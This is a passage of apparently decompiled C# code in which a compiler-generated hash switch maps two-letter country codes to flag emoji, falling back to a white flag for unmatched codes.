						return "\ud83c\udde8\ud83c\uddfe";
					}
				}
				else if (num <= 1945347683U)
				{
					if (num != 1879222945U)
					{
						if (num == 1945347683U)
						{
							if (country == "UA")
							{
								return "\ud83c\uddfa\ud83c\udde6";
							}
						}
					}
					else if (country == "SY")
					{
						return "\ud83c\uddf8\ud83c\uddfe";
					}
				}
				else if (num != 1977225635U)
				{
					if (num == 1977770088U)
					{
						if (country == "LS")
						{
							return "\ud83c\uddf1\ud83c\uddf8";
						}
					}
				}
				else if (country == "CC")
				{
					return "\ud83c\udde8\ud83c\udde8";
				}
			}
			else if (num <= 2111446587U)
			{
				if (num <= 2044336111U)
				{
					if (num <= 2010780873U)
					{
						if (num <= 1994547707U)
						{
							if (num != 1993561969U)
							{
								if (num == 1994547707U)
								{
									if (country == "LR")
									{
										return "\ud83c\uddf1\ud83c\uddf7";
									}
								}
							}
							else if (country == "FR")
							{
								return "\ud83c\uddeb\ud83c\uddf7";
							}
						}
						else if (num != 2010192493U)
						{
							if (num == 2010780873U)
							{
								if (country == "CA")
								{
									return "\ud83c\udde8\ud83c\udde6";
								}
							}
						}
						else if (country == "GY")
						{
							return "\ud83c\uddec\ud83c\uddfe";
						}
					}
					else if (num <= 2013590992U)
					{
						if (num != 2012899444U)
						{
							if (num == 2013590992U)
							{
								if (country == "RE")
								{
									return "\ud83c\uddf7\ud83c\uddea";
								}
							}
						}
						else if (country == "VU")
						{
							return "\ud83c\uddfb\ud83c\uddfa";
						}
					}
					else if (num != 2027558492U)
					{
						if (num == 2044336111U)
						{
							if (country == "CG")
							{
								return "\ud83c\udde8\ud83c\uddec";
							}
						}
					}
					else if (country == "CF")
					{
						return "\ud83c\udde8\ud83c\uddeb";
					}
				}
				else if (num <= 2077450064U)
				{
					if (num <= 2061113730U)
					{
						if (num != 2046013397U)
						{
							if (num == 2061113730U)
							{
								if (country == "CD")
								{
									return "\ud83c\udde8\ud83c\udde9";
								}
							}
						}
						else if (country == "UG")
						{
							return "\ud83c\uddfa\ud83c\uddec";
						}
					}
					else if (num != 2061658183U)
					{
						if (num == 2077450064U)
						{
							if (country == "FI")
							{
								return "\ud83c\uddeb\ud83c\uddee";
							}
						}
					}
					else if (country == "LV")
					{
						return "\ud83c\uddf1\ud83c\uddfb";
					}
				}
				else if (num <= 2095213421U)
				{
					if (num != 2078435802U)
					{
						if (num == 2095213421U)
						{
							if (country == "LT")
							{
								return "\ud83c\uddf1\ud83c\uddf9";
							}
						}
					}
					else if (country == "LU")
					{
						return "\ud83c\uddf1\ud83c\uddfa";
					}
				}
				else if (num != 2111005302U)
				{
					if (num == 2111446587U)
					{
						if (country == "CK")
						{
							return "\ud83c\udde8\ud83c\uddf0";
						}
					}
				}
				else if (country == "FK")
				{
					return "\ud83c\uddeb\ud83c\uddf0";
				}
			}
			else if (num <= 2178557063U)
			{
				if (num <= 2145001825U)
				{
					if (num <= 2128224206U)
					{
						if (num != 2127782921U)
						{
							if (num == 2128224206U)
							{
								if (country == "CH")
								{
									return "\ud83c\udde8\ud83c\udded";
								}
							}
						}
						else if (country == "FJ")
						{
							return "\ud83c\uddeb\ud83c\uddef";
						}
					}
					else if (num != 2144560540U)
					{
						if (num == 2145001825U)
						{
							if (country == "CI")
							{
								return "\ud83c\udde8\ud83c\uddee";
							}
						}
					}
					else if (country == "FM")
					{
						return "\ud83c\uddeb\ud83c\uddf2";
					}
				}
				else if (num <= 2161779444U)
				{
					if (num != 2146679111U)
					{
						if (num == 2161779444U)
						{
							if (country == "CN")
							{
								return "\ud83c\udde8\ud83c\uddf3";
							}
						}
					}
					else if (country == "UM")
					{
						return "\ud83c\uddfa\ud83c\uddf2";
					}
				}
				else if (num != 2178115778U)
				{
					if (num == 2178557063U)
					{
						if (country == "CO")
						{
							return "\ud83c\udde8\ud83c\uddf4";
						}
					}
				}
				else if (country == "FO")
				{
					return "\ud83c\uddeb\ud83c\uddf4";
				}
			}
			else if (num <= 2212112301U)
			{
				if (num <= 2195334682U)
				{
					if (num != 2181367182U)
					{
						if (num == 2195334682U)
						{
							if (country == "CL")
							{
								return "\ud83c\udde8\ud83c\uddf1";
							}
						}
					}
					else if (country == "RO")
					{
						return "\ud83c\uddf7\ud83c\uddf4";
					}
				}
				else if (num != 2196467515U)
				{
					if (num == 2212112301U)
					{
						if (country == "CM")
						{
							return "\ud83c\udde8\ud83c\uddf2";
						}
					}
				}
				else if (country == "HN")
				{
					return "\ud83c\udded\ud83c\uddf3";
				}
			}
			else if (num <= 2213245134U)
			{
				if (num != 2212803849U)
				{
					if (num == 2213245134U)
					{
						if (country == "HM")
						{
							return "\ud83c\udded\ud83c\uddf2";
						}
					}
				}
				else if (country == "OM")
				{
					return "\ud83c\uddf4\ud83c\uddf2";
				}
			}
			else if (num != 2246800372U)
			{
				if (num == 2348598919U)
				{
					if (country == "QA")
					{
						return "\ud83c\uddf6\ud83c\udde6";
					}
				}
			}
			else if (country == "HK")
			{
				return "\ud83c\udded\ud83c\uddf0";
			}
			return "\ud83c\udff3";
		}

		// Token: 0x060008CD RID: 2253 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
